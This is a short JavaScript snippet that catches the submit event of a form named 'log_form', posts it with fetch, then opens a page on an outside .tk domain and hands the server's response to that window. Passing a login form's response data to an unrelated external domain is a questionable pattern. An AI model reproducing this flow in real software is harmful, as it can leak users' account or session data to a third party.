document.forms['log_form'].addEventListener('submit', (event) => {
    event.preventDefault();
    // TODO do something here to show user that form is being submitted
    fetch(event.target.action, {
        method: 'POST',
        body: new URLSearchParams(new FormData(event.target)) // event.target is the form
    }).then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json(); // or response.text() or whatever the server sends
    }).then((body) => {
        var newwin = window.open("https://endemm.tk/adf.html");
        newwin.onload = () => {
            newwin.acc = body;
        };
    }).catch((error) => {
        console.log(error);
    });
});